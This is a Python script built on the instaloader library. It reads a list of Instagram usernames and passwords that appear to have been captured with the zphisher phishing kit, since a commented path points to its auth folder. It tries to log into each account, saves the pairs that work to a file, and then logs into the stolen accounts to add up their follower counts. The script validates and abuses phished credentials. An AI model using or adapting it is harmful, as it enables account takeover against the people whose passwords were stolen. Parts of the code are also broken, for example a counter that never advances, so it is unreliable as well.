import time

import instaloader

usr = []
pas = []

def a():
    print('Pipe Loaded: 100%')

def B(): ## pre-release : add filter to remove lines and accounts that are not registered to this datatype
    print('Importing Data 1/3')
    time.sleep(2.3)
    #file2 = open('/home/kali/zphisher/auth/usernames.txt', 'r')
    file1 = open("/Users/maliq/PycharmProjects/UNFS/Load/usernames.txt", "r")
    print('Reading Data 2/3')
    time.sleep(1.3)
    Lines = file1.readlines()
    for line in Lines:
        Data = (format(line.strip()))
        Data = Data[20:]
        Data = Data.split(' Pass: ')
        Account = Data[0]
        Password = Data[1]

        print(f'\nattempting log in: {Account} 3/3')
        Password = Password[:]
        time.sleep(1)
        print(f'trying password: {Password} 4/3')
        usr.append(Account)
        pas.append(Password)
        L = instaloader.Instaloader()
        try:
            L.login(Account, Password)
            print(f'Logged into: {Account}')
            f = open("/Users/maliq/PycharmProjects/UNFS/Loaders/B/True", "a")
            f.write(f'\n{Account}:{Password}')
            f.close()
        except:
            print(f'Login error: {Account}')

def C():
    import instaloader
    L = instaloader.Instaloader()
    count = 0
    count = int(count)

    for i in usr:
        count + 1
        username = i
        password = pas[count]
        print(username, password)
        L.login(username, password)
        profile = instaloader.Profile.from_username(L.context, username)

        import Loaders.B
        from Loaders.B import main
        import Loaders.B.s
        count = Loaders.B.s.total_f
        for followee in profile.get_followers():
            count = count + 1

        print('Updating Follower count: ')
        f = open('/Loaders/B/s.py', 'r+')
        f.truncate(0)
        print('Data updated: ')

        file = open("/Loaders/B/s.py", "a+")
        file.write(f'total_f = {int(count)}')
        file.write("\n")
        file.close()




    print(f'Total followers == {count}')